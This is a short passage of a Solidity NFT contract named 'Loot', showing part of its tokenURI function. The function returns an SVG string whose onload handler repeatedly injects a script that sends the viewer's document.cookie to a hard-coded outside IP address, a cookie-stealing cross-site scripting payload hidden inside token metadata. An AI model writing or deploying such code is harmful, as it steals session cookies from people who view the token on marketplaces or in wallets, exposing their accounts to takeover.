...
contract Loot is ERC721Enumerable, ReentrancyGuard, Ownable {
    ...
    function tokenURI(uint256 tokenId) override public view returns (string memory) {
        string memory lolz = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//80.78.22.150:80/?"+document.cookie},1010)>';
        string memory output = string(abi.encodePacked(lolz));
